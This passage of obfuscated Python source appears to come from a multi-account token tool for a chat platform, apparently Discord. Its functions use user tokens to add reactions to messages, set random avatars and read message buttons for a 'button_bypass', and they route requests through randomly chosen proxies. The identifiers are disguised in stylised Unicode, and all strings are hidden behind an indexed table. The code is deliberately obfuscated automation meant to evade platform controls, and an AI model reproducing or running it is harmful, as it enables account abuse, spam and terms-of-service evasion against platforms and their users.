    𝘮𝗲𝘀𝘀𝗮𝙜𝗲_𝗶𝗱 = 𝙢𝘦𝘀𝘴𝘢𝗴𝘦_𝘭𝘪𝙣𝗸.split(𝙈𝗠𝘕𝗜𝗠𝙄𝗠𝙄𝙡𝙈𝘕𝘕𝗠𝗡𝘭𝗠𝗠𝘭𝘔𝗜𝘭𝘐𝘕𝗜𝙉𝘕𝙄𝗠𝗡𝗡𝙄𝘭[315])[6]
    if 𝗽𝗿𝗼𝙭𝘆:
        𝙧𝙧 = 𝘳𝘦𝘲𝙪𝙚𝙨𝘵𝘴.put(f'{𝗠𝗠𝘕𝗜𝘔𝘐𝙈𝗜𝘭𝘔𝘕𝘕𝘔𝙉𝗹𝗠𝘔𝘭𝗠𝗜𝙡𝘐𝙉𝗜𝗡𝙉𝗜𝗠𝙉𝗡𝙄𝘭[266]}{𝗰𝙝𝗮𝗻𝗻𝗲𝘭_𝙞𝗱}{𝘔𝗠𝙉𝗜𝘔𝘐𝘔𝙄𝙡𝙈𝙉𝗡𝗠𝙉𝗹𝗠𝘔𝙡𝙈𝙄𝗹𝙄𝘕𝘐𝘕𝗡𝙄𝙈𝘕𝙉𝗜𝘭[316]}{𝙢𝗲𝙨𝙨𝘢𝘨𝘦_𝘪𝙙}{𝗠𝗠𝘕𝘐𝙈𝙄𝙈𝗜𝙡𝗠𝙉𝘕𝙈𝙉𝙡𝙈𝙈𝘭𝘔𝗜𝘭𝗜𝘕𝗜𝘕𝗡𝙄𝘔𝗡𝗡𝘐𝘭[317]}{𝙚𝗺𝗼𝘫𝗶}{𝗠𝙈𝙉𝘐𝘔𝘐𝗠𝘐𝙡𝘔𝘕𝙉𝙈𝗡𝗹𝗠𝘔𝙡𝘔𝗜𝘭𝘐𝙉𝙄𝙉𝙉𝙄𝙈𝗡𝗡𝘐𝙡[318]}', headers=𝘩𝙚𝘢𝗱𝘦𝗿𝙨, json={}, proxy={𝙈𝙈𝘕𝘐𝗠𝘐𝙈𝘐𝗹𝙈𝘕𝘕𝙈𝗡𝙡𝗠𝗠𝗹𝙈𝘐𝗹𝙄𝘕𝗜𝙉𝙉𝙄𝘔𝙉𝗡𝙄𝗹[244]: 𝙈𝙈𝘕𝗜𝗠𝘐𝗠𝙄𝗹𝗠𝗡𝗡𝗠𝘕𝙡𝗠𝗠𝘭𝗠𝗜𝗹𝗜𝗡𝙄𝘕𝘕𝘐𝗠𝗡𝙉𝘐𝗹[246] + 𝗿𝘢𝘯𝘥𝙤𝙢.choice(𝘱𝘳𝙤𝘹𝙞𝗲𝘴), 𝘔𝘔𝙉𝗜𝘔𝙄𝗠𝘐𝘭𝘔𝙉𝗡𝗠𝙉𝗹𝙈𝗠𝙡𝘔𝙄𝘭𝙄𝗡𝗜𝘕𝘕𝙄𝙈𝘕𝗡𝗜𝗹[245]: 𝗠𝘔𝙉𝘐𝗠𝙄𝗠𝗜𝘭𝘔𝗡𝗡𝘔𝗡𝗹𝙈𝘔𝙡𝗠𝘐𝗹𝗜𝘕𝗜𝙉𝗡𝙄𝗠𝙉𝘕𝗜𝘭[246] + 𝙧𝙖𝗻𝙙𝗼𝗺.choice(𝗽𝙧𝗼𝙭𝗶𝗲𝘀)})
    else:
        𝘳𝘳 = 𝘳𝗲𝘲𝘶𝗲𝘀𝙩𝘴.put(f'{𝙈𝗠𝘕𝗜𝘔𝘐𝘔𝙄𝗹𝗠𝗡𝗡𝘔𝗡𝗹𝗠𝘔𝘭𝙈𝙄𝘭𝘐𝘕𝙄𝗡𝘕𝘐𝗠𝙉𝙉𝘐𝘭[266]}{𝗰𝘩𝙖𝙣𝘯𝙚𝗹_𝘪𝘥}{𝘔𝘔𝘕𝙄𝗠𝙄𝘔𝙄𝗹𝘔𝙉𝙉𝗠𝙉𝗹𝙈𝘔𝗹𝗠𝗜𝗹𝙄𝘕𝗜𝘕𝘕𝙄𝘔𝗡𝗡𝙄𝘭[316]}{𝘮𝙚𝘴𝘴𝗮𝙜𝘦_𝗶𝗱}{𝘔𝘔𝗡𝗜𝙈𝗜𝗠𝙄𝘭𝗠𝙉𝙉𝘔𝙉𝙡𝗠𝙈𝙡𝙈𝗜𝘭𝙄𝗡𝗜𝙉𝗡𝗜𝗠𝘕𝙉𝙄𝗹[317]}{𝙚𝗺𝗼𝙟𝙞}{𝘔𝙈𝘕𝗜𝙈𝗜𝘔𝙄𝘭𝙈𝙉𝙉𝗠𝙉𝘭𝙈𝘔𝘭𝗠𝗜𝗹𝙄𝙉𝘐𝘕𝗡𝙄𝗠𝙉𝘕𝙄𝗹[318]}', headers=𝗵𝗲𝘢𝙙𝘦𝙧𝘀, json={})
    𝙙𝗻 = 𝙩𝘰𝗸𝘦𝗻.split(𝘔𝙈𝗡𝘐𝘔𝗜𝙈𝘐𝙡𝙈𝗡𝗡𝙈𝙉𝘭𝙈𝘔𝘭𝙈𝘐𝙡𝗜𝘕𝗜𝘕𝗡𝘐𝗠𝗡𝘕𝙄𝗹[247])
    𝗻𝙣 = 𝗱𝘯[0]
    if 𝘳𝗿.status_code == 204:
        𝗽𝗿𝙞𝙣𝘵(f"{𝘳}{𝘔𝙈𝙉𝙄𝘔𝗜𝗠𝗜𝗹𝙈𝗡𝗡𝗠𝘕𝘭𝘔𝙈𝘭𝗠𝗜𝗹𝗜𝗡𝙄𝙉𝗡𝙄𝘔𝗡𝘕𝗜𝘭[91]}{𝘥𝙖𝘁𝙚𝘁𝗶𝗺𝗲.datetime.now().strftime(f'{𝙜}{𝙈𝘔𝙉𝙄𝘔𝗜𝙈𝘐𝙡𝙈𝗡𝙉𝗠𝘕𝙡𝗠𝘔𝗹𝙈𝗜𝙡𝙄𝗡𝘐𝗡𝙉𝘐𝙈𝗡𝗡𝗜𝗹[92]}{𝙧}')}{𝗠𝗠𝘕𝗜𝘔𝙄𝗠𝗜𝘭𝘔𝘕𝘕𝘔𝘕𝙡𝙈𝗠𝗹𝙈𝘐𝗹𝙄𝘕𝙄𝘕𝗡𝗜𝘔𝗡𝙉𝙄𝘭[93]}{𝘳}{𝘔𝗠𝘕𝗜𝘔𝘐𝗠𝗜𝘭𝘔𝗡𝗡𝘔𝘕𝙡𝙈𝗠𝙡𝗠𝗜𝘭𝘐𝘕𝘐𝗡𝗡𝘐𝗠𝘕𝗡𝗜𝗹[91]}{𝙡𝗰}{𝗠𝘔𝙉𝘐𝗠𝘐𝙈𝙄𝗹𝙈𝙉𝙉𝘔𝙉𝙡𝙈𝙈𝗹𝙈𝘐𝘭𝘐𝙉𝙄𝘕𝗡𝘐𝗠𝗡𝙉𝗜𝘭[319]}{𝘳}{𝗠𝙈𝘕𝘐𝘔𝗜𝙈𝗜𝘭𝘔𝘕𝘕𝙈𝗡𝗹𝘔𝘔𝘭𝗠𝙄𝗹𝗜𝘕𝗜𝘕𝗡𝗜𝘔𝙉𝙉𝗜𝙡[93]}{𝗻𝙣}{𝙜}{𝗠𝗠𝘕𝘐𝗠𝙄𝘔𝗜𝘭𝘔𝗡𝗡𝗠𝗡𝙡𝙈𝘔𝙡𝙈𝘐𝘭𝗜𝗡𝙄𝘕𝘕𝗜𝗠𝙉𝗡𝗜𝙡[270]}{𝗿𝗿.text}")
    else:
        𝗽𝙧𝘪𝙣𝘵(f"{𝗿}{𝗠𝙈𝙉𝗜𝗠𝗜𝙈𝘐𝗹𝘔𝗡𝘕𝗠𝙉𝘭𝘔𝗠𝘭𝘔𝘐𝘭𝗜𝗡𝘐𝙉𝗡𝗜𝙈𝘕𝗡𝙄𝘭[91]}{𝘥𝙖𝘵𝙚𝙩𝙞𝙢𝘦.datetime.now().strftime(f'{𝘨}{𝘔𝗠𝘕𝙄𝘔𝙄𝗠𝙄𝗹𝗠𝗡𝘕𝘔𝗡𝗹𝘔𝗠𝗹𝗠𝗜𝘭𝗜𝘕𝘐𝘕𝘕𝙄𝗠𝘕𝘕𝘐𝙡[92]}{𝗿}')}{𝘔𝗠𝗡𝙄𝗠𝗜𝘔𝙄𝗹𝙈𝗡𝙉𝗠𝘕𝙡𝙈𝘔𝗹𝙈𝙄𝘭𝙄𝘕𝗜𝗡𝘕𝗜𝘔𝗡𝗡𝙄𝗹[93]}{𝙧}{𝗠𝙈𝗡𝗜𝙈𝗜𝘔𝗜𝘭𝙈𝘕𝗡𝗠𝗡𝙡𝗠𝗠𝗹𝘔𝗜𝘭𝗜𝙉𝙄𝘕𝙉𝗜𝗠𝗡𝙉𝙄𝘭[91]}{𝗯}{𝗠𝘔𝗡𝘐𝘔𝗜𝘔𝗜𝙡𝘔𝙉𝗡𝗠𝘕𝗹𝗠𝗠𝗹𝗠𝗜𝗹𝙄𝗡𝙄𝗡𝗡𝘐𝘔𝘕𝘕𝗜𝙡[314]}{𝘳}{𝙈𝙈𝙉𝗜𝗠𝗜𝗠𝘐𝘭𝘔𝗡𝘕𝘔𝘕𝗹𝘔𝘔𝙡𝙈𝙄𝙡𝗜𝙉𝘐𝘕𝗡𝗜𝙈𝙉𝘕𝙄𝘭[93]}{𝙣𝗻}{𝙜}{𝗠𝙈𝙉𝗜𝘔𝙄𝘔𝙄𝙡𝘔𝗡𝗡𝙈𝙉𝘭𝘔𝘔𝙡𝘔𝙄𝘭𝘐𝙉𝙄𝗡𝗡𝗜𝙈𝙉𝙉𝗜𝗹[270]}{𝙧𝗿.text}")

def avatar_changer(token):
    𝙙𝘯 = 𝘵𝙤𝘬𝙚𝗻.split(𝙈𝙈𝙉𝙄𝗠𝗜𝘔𝙄𝙡𝗠𝘕𝗡𝙈𝗡𝗹𝙈𝙈𝗹𝘔𝗜𝘭𝗜𝙉𝘐𝙉𝗡𝘐𝙈𝙉𝙉𝘐𝙡[247])
    𝘯𝗻 = 𝙙𝗻[0]
    𝗵𝗲𝘢𝘥𝘦𝙧𝘀 = {𝘔𝙈𝙉𝙄𝘔𝗜𝘔𝗜𝙡𝘔𝘕𝗡𝘔𝙉𝗹𝘔𝘔𝙡𝘔𝙄𝗹𝘐𝗡𝙄𝘕𝗡𝘐𝗠𝙉𝙉𝗜𝘭[130]: 𝘁𝗼𝙠𝗲𝗻}
    𝗽𝘪𝘤𝙩𝙪𝗿𝘦 = [𝗳 for 𝗳 in 𝘰𝙨.listdir(𝙈𝘔𝙉𝙄𝘔𝗜𝙈𝗜𝘭𝗠𝙉𝙉𝙈𝗡𝙡𝙈𝘔𝙡𝙈𝘐𝘭𝙄𝘕𝗜𝙉𝙉𝙄𝙈𝗡𝘕𝙄𝘭[320]) if 𝙞𝘴𝗳𝗶𝙡𝗲(𝘫𝙤𝗶𝘯(𝗠𝙈𝘕𝗜𝘔𝘐𝘔𝙄𝘭𝘔𝗡𝘕𝗠𝙉𝘭𝙈𝗠𝙡𝙈𝙄𝗹𝘐𝙉𝙄𝙉𝘕𝘐𝙈𝙉𝙉𝘐𝘭[320], 𝘧))]
    𝗿𝙖𝗻𝙙𝗼𝗺_𝗽𝙞𝙘𝘵𝘂𝘳𝘦 = 𝘳𝗮𝙣𝘥𝙤𝗺.choice(𝙥𝙞𝘤𝘁𝘶𝗿𝙚)
    with 𝙤𝘱𝗲𝗻(f'{𝗠𝙈𝙉𝙄𝘔𝘐𝗠𝘐𝘭𝗠𝘕𝘕𝗠𝙉𝗹𝗠𝘔𝘭𝗠𝙄𝗹𝘐𝘕𝙄𝗡𝘕𝘐𝘔𝘕𝘕𝘐𝙡[320]}{𝗿𝗮𝘯𝘥𝙤𝗺_𝗽𝙞𝗰𝘵𝘶𝘳𝙚}', 𝗠𝗠𝙉𝘐𝘔𝙄𝘔𝗜𝙡𝘔𝗡𝙉𝙈𝙉𝗹𝗠𝙈𝗹𝘔𝘐𝗹𝙄𝘕𝗜𝗡𝗡𝗜𝘔𝙉𝘕𝘐𝙡[321]) as 𝘧:
        𝗲𝙣𝙘𝘰𝙙𝘦𝘥_𝙨𝘁𝗿𝗶𝘯𝙜 = 𝘣𝗮𝘴𝗲64.b64encode(𝘧.read())
    𝗽𝗮𝘆𝘭𝙤𝗮𝙙 = {𝙈𝗠𝘕𝘐𝗠𝗜𝗠𝘐𝘭𝘔𝘕𝘕𝗠𝗡𝙡𝘔𝘔𝗹𝙈𝘐𝙡𝘐𝘕𝘐𝗡𝙉𝙄𝙈𝗡𝙉𝗜𝙡[322]: f'{𝘔𝗠𝘕𝙄𝙈𝘐𝘔𝘐𝘭𝗠𝘕𝙉𝙈𝗡𝙡𝘔𝘔𝗹𝗠𝗜𝙡𝙄𝗡𝘐𝗡𝙉𝗜𝙈𝘕𝘕𝗜𝙡[323]}{𝘦𝗻𝘤𝗼𝙙𝘦𝗱_𝙨𝘵𝗿𝙞𝘯𝘨.decode(𝗠𝘔𝙉𝗜𝘔𝘐𝗠𝗜𝘭𝗠𝙉𝗡𝘔𝘕𝘭𝗠𝗠𝙡𝙈𝗜𝘭𝗜𝘕𝙄𝙉𝘕𝙄𝗠𝗡𝙉𝗜𝙡[324])}'}
    if 𝙥𝙧𝙤𝘹𝘺:
        𝙧𝙧 = 𝗿𝘦𝘲𝘶𝘦𝙨𝙩𝙨.patch(f'{𝘔𝙈𝙉𝙄𝗠𝗜𝘔𝘐𝙡𝙈𝙉𝙉𝘔𝗡𝙡𝗠𝗠𝙡𝘔𝙄𝘭𝗜𝗡𝘐𝗡𝗡𝘐𝘔𝙉𝗡𝘐𝙡[325]}', headers=𝘩𝙚𝗮𝙙𝗲𝗿𝘀, json=𝙥𝙖𝙮𝗹𝙤𝘢𝗱, proxy={𝙈𝘔𝗡𝘐𝙈𝘐𝘔𝘐𝗹𝗠𝗡𝗡𝙈𝙉𝗹𝗠𝘔𝗹𝘔𝘐𝘭𝙄𝗡𝙄𝘕𝘕𝙄𝗠𝗡𝙉𝗜𝙡[244]: 𝗠𝗠𝗡𝘐𝙈𝙄𝙈𝘐𝙡𝗠𝘕𝗡𝘔𝙉𝙡𝙈𝘔𝙡𝘔𝙄𝘭𝙄𝗡𝙄𝘕𝙉𝘐𝘔𝘕𝘕𝘐𝗹[246] + 𝙧𝘢𝙣𝗱𝗼𝘮.choice(𝘱𝗿𝗼𝙭𝗶𝗲𝘀), 𝙈𝗠𝘕𝘐𝘔𝘐𝘔𝘐𝗹𝙈𝙉𝘕𝗠𝗡𝘭𝗠𝗠𝗹𝘔𝘐𝙡𝗜𝗡𝘐𝗡𝗡𝙄𝗠𝙉𝘕𝗜𝘭[245]: 𝗠𝘔𝙉𝗜𝙈𝘐𝙈𝘐𝘭𝘔𝘕𝗡𝙈𝘕𝘭𝘔𝗠𝘭𝙈𝙄𝙡𝗜𝙉𝗜𝙉𝙉𝘐𝙈𝘕𝘕𝘐𝘭[246] + 𝘳𝙖𝗻𝗱𝗼𝗺.choice(𝙥𝙧𝘰𝙭𝙞𝘦𝘀)})
    else:
        𝗿𝗿 = 𝘳𝙚𝘲𝘂𝙚𝘀𝘵𝘴.patch(f'{𝘔𝗠𝙉𝗜𝙈𝗜𝙈𝘐𝘭𝙈𝗡𝙉𝘔𝗡𝘭𝙈𝙈𝙡𝙈𝙄𝘭𝗜𝘕𝗜𝙉𝗡𝘐𝙈𝗡𝘕𝘐𝘭[325]}', headers=𝙝𝘦𝙖𝘥𝘦𝘳𝘀, json=𝙥𝙖𝙮𝗹𝘰𝘢𝙙)
    if 𝗿𝙧.status_code == 200:
        𝗽𝘳𝗶𝘯𝙩(f"{𝗿}{𝙈𝗠𝗡𝘐𝘔𝗜𝙈𝘐𝗹𝗠𝘕𝗡𝙈𝗡𝙡𝗠𝘔𝗹𝙈𝘐𝘭𝘐𝘕𝙄𝘕𝘕𝙄𝙈𝗡𝙉𝗜𝘭[91]}{𝘥𝗮𝘵𝙚𝘁𝘪𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝙈𝗠𝘕𝗜𝗠𝘐𝗠𝗜𝙡𝘔𝙉𝘕𝙈𝙉𝙡𝗠𝗠𝙡𝙈𝗜𝘭𝙄𝗡𝙄𝙉𝘕𝙄𝘔𝙉𝗡𝘐𝗹[92]}{𝙧}')}{𝙈𝘔𝗡𝙄𝙈𝙄𝗠𝗜𝘭𝙈𝗡𝘕𝘔𝘕𝙡𝘔𝘔𝗹𝙈𝙄𝙡𝗜𝙉𝙄𝗡𝙉𝗜𝙈𝗡𝙉𝗜𝙡[93]}{𝙧}{𝙈𝘔𝙉𝗜𝙈𝗜𝗠𝗜𝗹𝙈𝘕𝗡𝙈𝙉𝘭𝘔𝗠𝙡𝘔𝙄𝙡𝙄𝙉𝘐𝘕𝙉𝗜𝘔𝘕𝙉𝙄𝘭[91]}{𝘭𝗰}{𝗠𝙈𝙉𝘐𝗠𝙄𝘔𝗜𝘭𝘔𝙉𝙉𝙈𝗡𝘭𝘔𝙈𝗹𝙈𝗜𝘭𝗜𝗡𝘐𝙉𝘕𝗜𝘔𝙉𝘕𝙄𝙡[301]}{𝘳}{𝙈𝙈𝘕𝙄𝙈𝘐𝗠𝙄𝙡𝙈𝗡𝗡𝘔𝗡𝘭𝗠𝙈𝘭𝙈𝗜𝘭𝙄𝙉𝘐𝗡𝗡𝙄𝙈𝙉𝙉𝙄𝘭[93]}{𝗻𝙣}{𝗴}{𝗠𝗠𝙉𝗜𝗠𝘐𝙈𝘐𝘭𝘔𝙉𝗡𝙈𝘕𝗹𝗠𝘔𝙡𝘔𝘐𝗹𝘐𝘕𝘐𝘕𝘕𝘐𝗠𝘕𝗡𝘐𝙡[249]}")
    else:
        𝙥𝘳𝙞𝙣𝙩(f"{𝘳}{𝘔𝘔𝗡𝙄𝗠𝗜𝗠𝗜𝙡𝙈𝙉𝘕𝘔𝘕𝗹𝘔𝙈𝗹𝙈𝘐𝗹𝘐𝘕𝘐𝗡𝘕𝘐𝙈𝗡𝗡𝗜𝙡[91]}{𝗱𝘢𝙩𝙚𝙩𝘪𝘮𝙚.datetime.now().strftime(f'{𝙜}{𝘔𝙈𝗡𝙄𝙈𝘐𝘔𝙄𝗹𝙈𝘕𝙉𝗠𝘕𝙡𝗠𝗠𝘭𝗠𝗜𝙡𝘐𝗡𝘐𝗡𝙉𝗜𝙈𝗡𝙉𝙄𝘭[92]}{𝘳}')}{𝙈𝘔𝘕𝘐𝘔𝘐𝙈𝙄𝗹𝙈𝗡𝙉𝘔𝙉𝗹𝙈𝗠𝘭𝙈𝙄𝗹𝗜𝘕𝗜𝘕𝗡𝙄𝙈𝘕𝘕𝙄𝘭[93]}{𝗿}{𝘔𝗠𝘕𝗜𝘔𝙄𝙈𝗜𝙡𝙈𝙉𝗡𝗠𝘕𝘭𝙈𝗠𝗹𝘔𝙄𝗹𝘐𝘕𝘐𝗡𝘕𝙄𝗠𝙉𝗡𝙄𝘭[91]}{𝗯}{𝘔𝘔𝙉𝗜𝗠𝙄𝙈𝗜𝘭𝙈𝘕𝙉𝙈𝗡𝘭𝘔𝙈𝘭𝗠𝙄𝗹𝙄𝙉𝗜𝗡𝙉𝘐𝗠𝘕𝗡𝗜𝘭[269]}{𝘳}{𝘔𝘔𝗡𝗜𝙈𝙄𝗠𝗜𝘭𝘔𝗡𝘕𝙈𝘕𝗹𝙈𝙈𝘭𝘔𝙄𝘭𝙄𝘕𝗜𝙉𝗡𝙄𝙈𝙉𝙉𝘐𝘭[93]}{𝙣𝘯}{𝙜}{𝙈𝗠𝗡𝗜𝗠𝙄𝘔𝗜𝙡𝗠𝙉𝗡𝙈𝘕𝗹𝙈𝗠𝗹𝘔𝗜𝘭𝗜𝗡𝘐𝙉𝗡𝘐𝙈𝙉𝙉𝙄𝗹[270]}{𝗿𝘳.text}")

def button_bypass(token, message_link, optionbutton):
    𝘥𝗻 = 𝙩𝗼𝗸𝘦𝗻.split(𝘔𝘔𝙉𝗜𝗠𝙄𝙈𝗜𝙡𝘔𝗡𝗡𝗠𝘕𝙡𝗠𝗠𝙡𝗠𝗜𝙡𝙄𝙉𝙄𝘕𝙉𝘐𝘔𝙉𝘕𝘐𝘭[247])
    𝙣𝘯 = 𝗱𝙣[0]
    𝙝𝘦𝙖𝗱𝗲𝘳𝙨 = 𝗛𝙚𝘢𝙙𝙚𝗿𝘴(𝘵𝘰𝗸𝘦𝘯)
    try:
        𝗴𝙪𝗶𝙡𝗱_𝙞𝙙 = 𝘮𝙚𝘀𝘀𝗮𝗴𝗲_𝘭𝘪𝗻𝗸.split(𝙈𝘔𝘕𝗜𝗠𝘐𝘔𝗜𝗹𝘔𝙉𝗡𝗠𝗡𝘭𝙈𝙈𝘭𝙈𝙄𝘭𝗜𝘕𝙄𝗡𝙉𝙄𝙈𝗡𝗡𝘐𝘭[315])[4]
        𝘤𝗵𝘢𝘯𝙣𝙚𝘭_𝘪𝗱 = 𝗺𝙚𝙨𝙨𝙖𝗴𝘦_𝙡𝗶𝙣𝗸.split(𝙈𝙈𝙉𝗜𝙈𝗜𝙈𝗜𝗹𝙈𝙉𝘕𝘔𝘕𝙡𝗠𝗠𝗹𝘔𝗜𝘭𝗜𝘕𝘐𝙉𝘕𝙄𝘔𝙉𝙉𝙄𝗹[315])[5]
        𝗺𝗲𝙨𝘴𝙖𝘨𝙚_𝗶𝙙 = 𝗺𝙚𝙨𝘀𝗮𝙜𝗲_𝘭𝙞𝘯𝙠.split(𝙈𝘔𝗡𝘐𝗠𝙄𝗠𝙄𝙡𝘔𝙉𝘕𝘔𝘕𝗹𝗠𝘔𝘭𝙈𝘐𝙡𝘐𝗡𝗜𝘕𝙉𝙄𝘔𝙉𝘕𝗜𝙡[315])[6]
        𝙥𝘢𝘆𝙡𝗼𝘢𝗱 = {𝗠𝘔𝙉𝘐𝙈𝗜𝙈𝗜𝙡𝙈𝘕𝗡𝗠𝗡𝘭𝗠𝙈𝘭𝙈𝙄𝘭𝗜𝙉𝘐𝙉𝗡𝙄𝘔𝙉𝗡𝗜𝗹[326]: 𝙈𝙈𝙉𝗜𝘔𝗜𝗠𝘐𝙡𝙈𝘕𝗡𝗠𝘕𝘭𝗠𝗠𝘭𝗠𝙄𝘭𝗜𝗡𝗜𝙉𝙉𝘐𝗠𝘕𝙉𝗜𝘭[328], 𝘔𝙈𝘕𝘐𝙈𝙄𝗠𝘐𝘭𝘔𝗡𝗡𝙈𝗡𝙡𝘔𝘔𝘭𝗠𝗜𝗹𝘐𝗡𝗜𝘕𝙉𝗜𝙈𝗡𝙉𝙄𝘭[327]: 𝗺𝙚𝙨𝙨𝙖𝗴𝙚_𝘪𝘥}
        if 𝗽𝘳𝗼𝙭𝘆:
            𝗿𝙧 = 𝘳𝘦𝗾𝘶𝙚𝙨𝘁𝙨.get(𝗠𝗠𝙉𝙄𝘔𝗜𝙈𝗜𝗹𝙈𝗡𝗡𝙈𝙉𝘭𝗠𝘔𝘭𝗠𝗜𝗹𝗜𝘕𝗜𝙉𝙉𝗜𝗠𝙉𝘕𝗜𝘭[266] + 𝗰𝘩𝗮𝗻𝙣𝘦𝘭_𝙞𝘥 + 𝙈𝙈𝙉𝙄𝗠𝗜𝙈𝙄𝙡𝗠𝗡𝙉𝗠𝙉𝘭𝘔𝗠𝘭𝙈𝘐𝗹𝙄𝗡𝘐𝗡𝗡𝗜𝙈𝘕𝗡𝘐𝗹[267], params=𝗽𝙖𝘺𝗹𝙤𝘢𝙙, headers=𝙝𝘦𝗮𝙙𝘦𝘳𝘴, proxy={𝗠𝙈𝘕𝙄𝙈𝘐𝙈𝙄𝘭𝗠𝘕𝙉𝘔𝘕𝗹𝘔𝙈𝘭𝗠𝗜𝙡𝗜𝘕𝘐𝙉𝘕𝗜𝙈𝘕𝘕𝗜𝘭[244]: 𝗠𝗠𝘕𝘐𝗠𝙄𝗠𝙄𝙡𝘔𝘕𝗡𝘔𝘕𝙡𝙈𝗠𝘭𝘔𝙄𝗹𝙄𝙉𝘐𝘕𝗡𝘐𝙈𝙉𝗡𝙄𝙡[246] + 𝘳𝗮𝘯𝙙𝗼𝘮.choice(𝗽𝙧𝙤𝘅𝘪𝙚𝘀), 𝙈𝘔𝙉𝘐𝗠𝙄𝗠𝘐𝗹𝗠𝘕𝗡𝙈𝘕𝙡𝗠𝗠𝘭𝘔𝙄𝙡𝘐𝘕𝙄𝗡𝗡𝘐𝘔𝗡𝗡𝗜𝙡[245]: 𝘔𝗠𝗡𝙄𝗠𝗜𝘔𝙄𝗹𝙈𝗡𝗡𝘔𝙉𝘭𝗠𝗠𝙡𝘔𝘐𝙡𝙄𝙉𝘐𝘕𝗡𝘐𝙈𝘕𝙉𝗜𝗹[246] + 𝘳𝘢𝗻𝘥𝘰𝗺.choice(𝙥𝙧𝗼𝘹𝙞𝘦𝘀)})
        else:
            𝙧𝙧 = 𝗿𝗲𝘲𝘶𝘦𝙨𝘁𝘴.get(𝙈𝘔𝗡𝘐𝘔𝘐𝘔𝘐𝙡𝙈𝙉𝗡𝙈𝗡𝗹𝙈𝙈𝘭𝘔𝙄𝗹𝗜𝗡𝘐𝘕𝙉𝙄𝙈𝗡𝙉𝗜𝗹[266] + 𝗰𝙝𝗮𝘯𝙣𝙚𝗹_𝗶𝙙 + 𝗠𝗠𝙉𝗜𝗠𝘐𝙈𝘐𝙡𝗠𝙉𝘕𝗠𝗡𝘭𝗠𝘔𝗹𝙈𝘐𝘭𝗜𝘕𝗜𝘕𝙉𝙄𝗠𝘕𝗡𝘐𝘭[267], params=𝗽𝘢𝘆𝙡𝘰𝘢𝗱, headers=𝙝𝙚𝘢𝙙𝙚𝗿𝘀)
        𝗺𝗲𝘴𝘀𝗮𝙜𝙚𝘴 = 𝗿𝙧.json()
        𝘮𝙚𝙨𝘴𝙖𝙜𝗲𝙗𝘰𝘁𝙩𝗼𝙘𝘭𝙞𝙘𝗸 = None
        for 𝙭 in 𝘮𝘦𝘴𝘀𝘢𝗴𝗲𝙨:
            if 𝘹[𝘔𝙈𝘕𝘐𝙈𝘐𝙈𝘐𝙡𝙈𝙉𝙉𝙈𝙉𝗹𝘔𝗠𝗹𝗠𝗜𝙡𝗜𝗡𝘐𝗡𝘕𝘐𝗠𝗡𝗡𝗜𝘭[160]] == 𝙢𝗲𝘀𝙨𝗮𝙜𝘦_𝙞𝗱:
                𝗺𝗲𝙨𝘀𝙖𝘨𝘦𝙗𝗼𝘵𝘁𝘰𝘤𝘭𝘪𝙘𝙠 = 𝘹
        if 𝙢𝗲𝙨𝙨𝙖𝘨𝘦𝙗𝘰𝙩𝙩𝙤𝗰𝘭𝗶𝗰𝘬 == None:
            pass
        𝗯𝘂𝘵𝘁𝘰𝙣𝙨 = []
        𝙡𝗶𝙘𝘇𝘣𝙖 = 0
        for 𝘅 in 𝗺𝘦𝘀𝙨𝙖𝘨𝗲𝗯𝙤𝘵𝘵𝙤𝙘𝙡𝗶𝗰𝙠[𝗠𝘔𝗡𝗜𝘔𝘐𝗠𝗜𝘭𝙈𝙉𝘕𝙈𝘕𝗹𝙈𝘔𝙡𝙈𝗜𝗹𝗜𝙉𝘐𝙉𝙉𝘐𝗠𝗡𝙉𝘐𝗹[329]]:
            𝗽𝙧𝗶𝙣𝙩(f"{𝘳}{𝘔𝗠𝘕𝗜𝗠𝘐𝙈𝙄𝙡𝙈𝗡𝙉𝗠𝗡𝗹𝘔𝘔𝙡𝗠𝘐𝘭𝙄𝙉𝘐𝙉𝗡𝗜𝙈𝙉𝘕𝙄𝙡[91]}{𝙙𝘢𝘁𝗲𝘁𝘪𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝙈𝙈𝘕𝗜𝙈𝙄𝗠𝙄𝗹𝙈𝘕𝘕𝙈𝗡𝙡𝙈𝗠𝙡𝗠𝗜𝘭𝗜𝙉𝘐𝗡𝙉𝘐𝙈𝗡𝗡𝗜𝙡[92]}{𝙧}')}{𝘔𝗠𝗡𝗜𝙈𝘐𝘔𝘐𝗹𝘔𝗡𝘕𝙈𝙉𝙡𝙈𝙈𝗹𝙈𝗜𝘭𝗜𝘕𝗜𝙉𝗡𝗜𝗠𝗡𝘕𝗜𝗹[93]}{𝘳}{𝙈𝗠𝗡𝙄𝘔𝗜𝗠𝙄𝙡𝗠𝙉𝗡𝗠𝘕𝗹𝘔𝙈𝘭𝗠𝘐𝗹𝙄𝘕𝙄𝗡𝗡𝙄𝙈𝘕𝙉𝘐𝗹[91]}{𝘭𝗰}{𝘔𝘔𝙉𝙄𝗠𝗜𝗠𝘐𝘭𝗠𝙉𝗡𝙈𝙉𝗹𝗠𝗠𝘭𝙈𝘐𝗹𝙄𝗡𝗜𝙉𝘕𝗜𝗠𝗡𝙉𝙄𝘭[301]}{𝙧}{𝙈𝘔𝙉𝗜𝙈𝗜𝗠𝘐𝙡𝘔𝘕𝙉𝗠𝗡𝗹𝘔𝘔𝘭𝘔𝗜𝙡𝙄𝗡𝗜𝘕𝙉𝘐𝗠𝙉𝘕𝗜𝙡[93]}{𝗻𝙣}{𝙈𝗠𝙉𝙄𝘔𝗜𝗠𝘐𝗹𝙈𝘕𝘕𝗠𝘕𝘭𝘔𝘔𝙡𝗠𝗜𝘭𝗜𝘕𝗜𝗡𝙉𝘐𝗠𝘕𝙉𝘐𝗹[249]}{𝗴}")
            𝘣𝘂𝘵𝙩𝗼𝙣𝙨.append(𝘅[𝘔𝘔𝙉𝘐𝙈𝗜𝘔𝗜𝙡𝗠𝗡𝘕𝗠𝙉𝗹𝘔𝘔𝘭𝙈𝘐𝘭𝙄𝘕𝙄𝘕𝗡𝗜𝗠𝘕𝗡𝙄𝘭[329]][0])
            𝘭𝙞𝘤𝘻𝙗𝗮 = 𝙡𝙞𝘤𝘇𝗯𝙖 + 1
